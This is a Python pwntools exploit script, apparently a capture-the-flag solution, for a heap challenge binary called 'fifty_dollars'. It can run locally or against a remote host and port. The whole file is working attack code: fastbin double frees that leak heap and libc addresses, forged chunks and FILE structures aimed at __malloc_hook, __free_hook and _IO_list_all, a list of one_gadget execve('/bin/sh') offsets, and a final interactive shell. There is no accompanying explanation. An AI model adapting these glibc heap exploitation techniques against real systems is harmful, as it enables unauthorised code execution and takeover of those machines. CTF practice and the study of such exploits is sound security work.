from pwn import *
import sys

### Config ###
filename = './fifty_dollars'
rhost = "178.62.40.102"
rport = 6001

### Binary ###
context.binary = filename
binary = ELF(filename)

### Context ###
#context.arch=elf.arch
context.log_level='info' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

### Def function area ###

### Start exploit ###
if len(sys.argv) == 1:
    p = process([filename])
else:
    p = remote(rhost,rport)

def alloc(data, idx):
    p.sendafter(":", "1")
    p.sendafter("Index:", str(idx))
    p.sendafter("Content:", data)

def show(idx):
    p.sendafter(":", "2")
    p.sendafter(":", str(idx))

def free(idx):
    p.sendafter(":", "3")
    p.sendafter(":", str(idx))

alloc(p64(0x61) * 10, 0)
alloc(p64(0x61) * 10, 1)
alloc(p64(0x61) * 10, 2)
alloc(p64(0x61) * 10, 3)
alloc(p64(0x61) * 10, 4)
alloc(p64(0x61) * 10, 5)
alloc(p64(0x61) * 10, 6)
alloc(p64(0x61) * 10, 7)
alloc(p64(0x61) * 10, 8)
alloc(p64(0x61) * 10, 9)

free(0)
free(1)
free(0)

show(0)     # heap leak
heap = u64(p.recv(6).ljust(8, "\x00"))
heap_base = heap - 0x60
print hex(heap)
print hex(heap_base)

alloc("\xb0", 0)
alloc(p64(0x61) * 10, 1)
alloc(p64(0x61) * 10, 0)
alloc(p64(0) + p64(0x121), 3)

free(0)
free(1)
free(2)
show(2)

libc = u64(p.recv(6).ljust(8, "\x00"))
libc_base = libc - 0x3c4b78
system = libc_base + 0x45390
__malloc_hook = libc_base + 0x3c4b10
print hex(libc)
print hex(libc_base)
print hex(__malloc_hook)

###### second free stage 

free(0)
free(1)
free(0)

alloc(p64(heap_base + 0x2f0), 0)
alloc(p64(0x61) * 10, 1)
alloc(p64(0x61) * 10, 0)
alloc(p64(0) + p64(0xc1), 9)

free(0)
free(1)
free(5)
free(6)
free(7)
free(8)

############# GO ################
############# Main Exploit #############


alloc(p64(0x61) * 10, 0)
alloc(p64(0x61) * 10, 1)
alloc(p64(0x61) * 10, 2)
alloc(p64(0x61) * 10, 3)
alloc(p64(0x61) * 10, 9)
alloc(p64(0x61) * 10, 9)
alloc(p64(0x61) * 10, 9)

free(0)
free(1)
free(0)

alloc(p64(heap_base + 0xb0) + p64(0x61) * 9, 3)
alloc(p64(0), 3)
alloc(p64(0), 3)
alloc(p64(0) + p64(0x121 + 0x60) + p64(0), 3)
free(2)

##############

free(0)
free(1)
free(0)

'''

0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''


alloc(p64(heap_base + 0x1a0) * 10, 9)     # last
alloc(p64(0x71) * 10, 9)
alloc(p64(0x71) * 10, 9)
exp = p64(3) + p64(0) * 3 + p64(system) + p64(0) * 5
alloc(exp, 9)

###########

free(0)
free(1)
free(0)

_IO_list_all = libc_base + 0x3c5520
free_hook = libc_base + 0x3c67a8
t = free_hook - 0x20
IO_BUF = libc_base + 0x3c4918
READ_BASE = libc_base + 0x3c48f8
log.info("_IO_list_all : " + hex(_IO_list_all))

alloc(p64(heap_base + 0x150) * 10, 9)            # third
alloc(p64(0x61) * 10, 9)
alloc(p64(0x61) * 10, 9)
exp1 = p64(heap_base + 0xc0 + 0xd0) + p64(0) * 3 + p64(1) + p64(0) + p64(0)
exp1 += p64(heap_base + 0xc0 + 0xf8) + p64(1) + p64(2)
alloc(exp1, 9)        

free(0)
free(1)
free(0)

alloc(p64(heap_base + 0x100) + p64(0x61) * 9, 3)  # second
alloc(p64(0x61) * 8 + p64(0) * 2, 3)
alloc(p64(0x61) * 8 + p64(0) * 2, 3)
exp2 = p64(0) * 10
alloc(exp2, 3)

free(0)
free(1)
free(0)

alloc(p64(heap_base + 0xb0) * 10, 9)      # first
alloc(p64(0x61) * 10, 9)
alloc(p64(0x61) * 10, 9)
exp3 = "/bin/sh\x00" + p64(0xb1)        # size overwrite
#exp3 += p64(0xdeadbeefc0dec0de) + p64(_IO_list_all - 0x10)      # unsorted bin
exp3 += p64(0xddaa) + p64(IO_BUF - 0x10)      # unsorted bin
exp3 += p64(0) * 6
alloc(exp3, 9)
alloc(p32(0xddaa), 9)

for i in xrange(10):
    free(0)
    alloc("A" * 0x50, 9)

p.interactive()
